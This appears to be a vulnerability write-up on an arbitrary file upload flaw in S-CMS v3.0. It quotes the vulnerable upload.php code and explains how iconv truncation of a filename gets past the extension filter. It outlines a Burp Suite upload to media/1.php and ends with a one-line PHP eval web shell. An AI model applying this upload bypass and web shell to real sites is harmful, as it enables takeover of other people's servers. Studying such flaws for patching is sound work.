# S-CMS v3.0 background arbitrary file upload GetShell

Download the S-CMS v3.0 Enterprise Website System from the official website, https://www.s-cms.cn/download.html?code=php

Use phpstudy to build windows + php 5.3 + MYSQL environment

Upload location

![](https://i.loli.net/2019/07/31/5d418f66cf56c66693.png)

The vulnerability is located in /upload/upload.php and the key code is as follows

```php
if($_SESSION["form"]=="" && $_SESSION["user"]==""){
  die("请勿跨站上传");
}

$S_filetype = $S_data[0]["S_filetype"] . "|xls|txt|sql|csv";
$id = $_GET["id"];
$path = $_GET["path"];
$a=$_GET["a"];
$path = str_replace("@@", "..", $path);
$processid = $_GET["processid"];
$n = "file" . str_Replace("AN", "", $processid);
$filename = date("Ymdhms",time());
$kname = strtolower(substr($_FILES[$n]["name"],strrpos($_FILES[$n]["name"],'.')+1));

if($_FILES[$n]["size"]>2*1024*1024 && ($kname=="jpg" || $kname=="png" ||$kname=="jpeg" ||$kname=="gif" || $kname=="bmp")){
  die("图片文件请勿超过2M");
}

if(checklogin($_SESSION["user"],$_SESSION["pass"])){
  $file_type="|html|htm";
}else{
  $file_type="";
}

if($a=="a" && checklogin($_SESSION["user"],$_SESSION["pass"])){
  $k=iconv("UTF-8","gb2312",$_FILES[$n]["name"]);
}else{
  $k = $filename . "." . $kname;
}

if (preg_match('/asp|php|apsx|asax|ascx|cdx|cer|cgi|jsp'.$file_type.'/i', $kname)) {
    die("error|上传文件格式不允许！");
} else {
    if (strpos(strtolower($S_filetype) , $kname) !== false) {
        if (strpos($path, "../") !== false) {
            $p = $path;
        } else {
            $p = $_SERVER["DOCUMENT_ROOT"] . $path;
        }
        
        move_uploaded_file($_FILES[$n]["tmp_name"], $p . "/" . $k);
```

`$kname` is the file suffix, followed by blacklist and whitelist detection. Here is a legal suffix. The key is in the `move_uploaded_file` function. The last file name is determined by the `$k` variable, and `$k= Iconv("UTF-8","gb2312",$_FILES[$n]["name"]); `

When iconv converts a character set, it can cause truncation if there are characters in the string that are not allowed in the source character set sequence. UTF-8 allows a range of 0x00-0x7F in single-byte. If the converted character is not within the range, the `PHP_ICONV_ERR_ILLEGAL_SEQ` error will occur, and the subsequent characters will not be processed after the error, causing truncation.


So generate a file name that can cause truncation

![](https://i.loli.net/2019/07/31/5d4191b6a86e372129.png)

Add the get parameter a=a, replace the file name and change the file content, Burp Suite sends the package to php, and uploads to media/1.php by default.

![](https://i.loli.net/2019/07/31/5d4191e70b89280539.png)

Successful upload

![](https://i.loli.net/2019/07/31/5d41920a0883672445.png)

Getshell is also very simple, use `<?php @eval($_REQUEST[1];) ?>`

![](https://i.loli.net/2019/08/05/LrF248PTwKlMQet.png)